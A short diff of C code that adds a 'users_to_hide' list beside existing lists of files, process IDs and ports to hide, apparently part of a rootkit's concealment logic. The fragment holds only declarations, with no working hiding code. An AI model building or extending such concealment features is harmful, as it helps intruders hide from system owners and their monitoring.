@@ -12,6 +12,8 @@ typedef struct linked_list {
 list *files_to_hide = NULL;
 list *pids_to_hide = NULL;
 list *ports_to_hide = NULL;
+list *users_to_hide = NULL;
+
 
 
 static int insert_node(list** root, char *data) {
